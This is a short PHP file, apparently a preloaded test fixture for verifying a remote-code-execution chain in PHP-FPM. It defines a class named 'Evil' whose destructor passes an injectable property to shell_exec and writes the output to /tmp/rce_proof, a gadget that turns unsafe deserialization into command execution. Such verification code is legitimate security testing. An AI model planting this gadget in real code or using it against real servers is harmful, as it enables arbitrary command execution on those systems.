<?php
// Preloaded class for Chain C verification.
// The class must exist at FPM startup (opcache.preload) because the
// injected object is deserialized BEFORE any application code runs.
class Evil {
    public $cmd;
    public function __destruct() {
        // Runs as the FPM pool user (www-data), output goes to a proof file.
        @shell_exec(($this->cmd ?? 'id') . ' > /tmp/rce_proof 2>&1');
    }
}
